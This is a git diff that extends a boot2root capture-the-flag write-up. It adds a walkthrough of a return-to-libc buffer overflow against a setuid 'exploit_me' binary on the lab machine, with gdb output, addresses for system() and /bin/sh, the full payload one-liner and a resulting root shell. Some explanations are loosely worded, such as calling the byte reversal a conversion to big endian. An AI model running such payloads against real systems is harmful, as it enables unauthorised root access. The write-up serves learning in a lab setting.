@@ -9,7 +9,7 @@
 	- [Enumeration](#enumeration)
 	- [Gaining Access](#gaining-access)
 		- [Writeup 1](#writeup-1)
-
+		- [Writeup 2](#writeup-2)
 
 ## Introduction
 
@@ -466,3 +466,64 @@ And we can confirm it with a simple test:
 <p align="center">
   <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/segfault.png">
 </p>
+
+In order to exploit the buffer overflow, we also need to take the system architecture in mind when exploiting a buffer flow which will be also important in our case as following some guides will need lead to an actually exploit and thus need some extra work in order to gain the root shell.
+
+[Buffer Overflow Source 1](https://www.tallan.com/blog/2019/03/07/exploring-buffer-overflows-in-c-part-one-theory/)
+
+[Buffer Overflow Source 2](https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/)
+
+[Buffer Overflow Source 3](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)
+
+I'll skip the explanation of a buffer overflow as this is way better explained in the sources above.
+This is the code which successfully exploits the buffer overflow in the `exploit_me` program:
+```
+./exploit_me `python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"DUMM"+"\x58\xcc\xf8\xb7"'`
+```
+The size of the buffer is 140 bytes. Meaning that if we exceeded those 140 bytes and the string encroaches beyond its buffer, resulting in a segmentation fault as shown in the picture above. This means that we can inject malicious payloads in order to make the program to behave unexpectedly and potential gain access to a shell.
+
+What we basically are doing is creating a fake function stack frame. We will overwrite with the payload above the buffer and saved frame pointers with a bunch of `A`.
+
+The first thing we need is the address of the system function(first address in the payload).
+Inside gdb, we run the program adn trigger the buffer overflow:
+```
+(gdb)  r `python -c 'print "A"*141'`
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e40041 in ?? () from /lib/i386-linux-gnu/libc.so.6
+```
+And with `p system` we determine the address of the system function:
+```
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+Note, that we need to convert this little endian address to a big endian:
+```
+0xb7e6b060 -> 60B0E6B7
+```
+The big endian will be included into our payload.
+The next address we need is the address of `/bin/sh`, this is what we want to execute while having a buffer overflow.
+```
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+```
+And again we need to convert it to a big endian.
+```
+0xb7f8cc58 -> 58CCF8B7
+```
+
+The `DUMM` string between those two address is there because of the system architecture of b2r, which requires to have some dummy data between the `system()` and `/bin/sh` call.
+The payload is ready, let's execute is outside of the gdb:
+```
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "A"*140+"\x60\xb0\xe6\xb7"+"DUMM"+"\x58\xcc\xf8\xb7"'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���DUMMX���
+# whoami
+root
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+```
+Great! We got the root shell!
+This is it with write up 1, in order to pass the project we need to discover 2 different exploits to gain root access.
+I will continue with my second attempt in [Writeup 2](#writeup-2)
+
+### Writeup 2
